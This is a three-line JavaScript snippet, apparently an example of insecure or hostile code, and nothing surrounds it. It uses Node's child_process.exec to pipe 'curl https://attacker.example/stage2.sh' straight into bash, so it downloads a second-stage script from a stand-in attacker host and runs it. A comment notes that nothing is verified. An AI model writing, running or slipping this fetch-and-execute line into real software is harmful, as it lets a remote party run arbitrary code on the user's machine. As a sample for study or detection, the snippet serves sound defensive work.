const { exec } = require('child_process');
// Downloads and executes a remote script with no verification
exec('curl -s https://attacker.example/stage2.sh | bash');
